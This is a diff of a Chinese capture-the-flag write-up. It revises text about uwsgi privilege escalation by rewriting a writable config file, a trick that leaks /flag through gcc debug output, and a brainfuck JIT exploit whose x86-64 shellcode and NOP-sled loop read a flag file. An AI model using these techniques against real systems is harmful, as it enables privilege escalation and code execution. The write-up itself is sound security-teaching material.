@@ -99,7 +99,7 @@ buffer-size = 65535
 enable-threads = true
 pidfile = /tmp/uwsgi.pid
 ```
-这个权限设置就十分搞笑了，注意flask本身执行在uwsgi里，其用户是nobody，然后几乎所有目录和文件现在nobody都能写入（`chown nobody -R .`），所以我们离拿到完整的root权限只有一步之遥，即覆写`/tmp/uwsgi-ctf.ini`以删除其中的`uid = nobody`、然后干掉uwsgi让它以root权限重启。
+这个权限设置就十分搞笑了，注意flask本身执行在uwsgi里，其用户是nobody，然后`/tmp`文件夹下的文件现在nobody都能写入（`chmod 666 -R /tmp/*`），所以我们离拿到完整的root权限只有一步之遥，即覆写`/tmp/uwsgi-ctf.ini`以删除其中的`uid = nobody`、然后干掉uwsgi让它以root权限重启。
 
 检查下`../app.py`、`../utils.py`和`../chatbot.py`代码，没发现可以直接执行代码或是能写入文件并发送信号的漏洞，唯一感觉很奇怪的一点就是这道题允许直接连接一个内网IP然后发送任意二进制数据（即base64解码后的数据）。看上去是利用uwsgi监听的`127.0.0.1:3031`实现任意代码执行。
 
@@ -440,7 +440,7 @@ GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
 int a = 0; int main() { return 0; }
 ```
 然后直接用GCC编译`/flag`。如果没有额外添加参数，GCC会因为不知道`/flag`里是什么语言而拒绝编译，但不是什么大问题，用参数指明就好：
-```bash
+```text
 root@50afc0b3ae1f:/# gcc -x c -g /flag -o hello
 ```
 接下来按[GDB官方文档](https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html)的指示生成独立的debug文件：
@@ -1017,44 +1017,44 @@ int main(int argc, char *argv[])
      ```
   2. 在代码区写入构造好的代码：现在的位置再向右移动`0x20000 - 0x1fe01 + 0x1000 = 0x11ff`（注意glibc会多分配0x1000字节）就可以到达代码区域，为了让填入的代码可以被正确执行，可以先写入足够多的`nop`指令，随后插入任意想要执行的代码，只要之后执行的JIT函数落在了这段`nop`区间，目标代码就会恰好被执行。
       先来写一段目标代码，读取flag2并且写入到`stdout`：
-      ```assembly
-     .text
-     .global _start
+      ```unix-assembly
+      .text
+      .global _start
 
-     _start:
-       movq $2, %rax
-       leaq flag2_name(%rip), %rdi
-       xorq %rsi, %rsi
-       syscall // fd = open("flag2", O_RDONLY)
+      _start:
+        movq $2, %rax
+        leaq flag2_name(%rip), %rdi
+        xorq %rsi, %rsi
+        syscall // fd = open("flag2", O_RDONLY)
 
-       movq %rax, %rdi
-       xorq %rax, %rax
-       leaq flag2_content(%rip), %rsi
-       movq $0x100, %rdx
-       syscall // read(fd, flag2_content, 0x100)
+        movq %rax, %rdi
+        xorq %rax, %rax
+        leaq flag2_content(%rip), %rsi
+        movq $0x100, %rdx
+        syscall // read(fd, flag2_content, 0x100)
 
-       movq $1, %rax
-       movq %rax, %rdi
-       leaq flag2_content(%rip), %rsi
-       movq $0x100, %rdx
-       syscall // write(1, flag2_content, 0x100)
+        movq $1, %rax
+        movq %rax, %rdi
+        leaq flag2_content(%rip), %rsi
+        movq $0x100, %rdx
+        syscall // write(1, flag2_content, 0x100)
 
-       nop
+        nop
 
-     flag2_name: .string "flag2"
-     flag2_content: .skip 0xff
-     ```
-     然后在输出这段目标代码前先输出足够多的`nop`指令（0x90）：
-     ```bash
-     for ((i=0;i<512;++i)) do
-       echo -e -n '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
-     done
-     ```
-     最后通过brainfuck的读入功能写到代码区域：
-     ```brainfuck
-     +[->,+]
-     ```
-     注意这里以0xff作为代码截止的标记。
+      flag2_name: .string "flag2"
+      flag2_content: .skip 0xff
+      ```
+      然后在输出这段目标代码前先输出足够多的`nop`指令（0x90）：
+      ```bash
+      for ((i=0;i<512;++i)) do
+        echo -e -n '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+      done
+      ```
+      最后通过brainfuck的读入功能写到代码区域：
+      ```brainfuck
+      +[->,+]
+      ```
+      注意这里以0xff作为代码截止的标记。
   3. 触发代码执行：JIT编译的代码是从前往后放置的，所以实际上只需把前述所有代码放在一个大循环里，在循环的第二次解释执行时一定会遇到早期代码的JIT编译执行，这期望执行一个保存JIT代码区域前部的函数，因为前部已经被目标代码前部的`nop`指令覆盖，那么就会触发目标代码执行。
 
 完整brainfuck代码为：
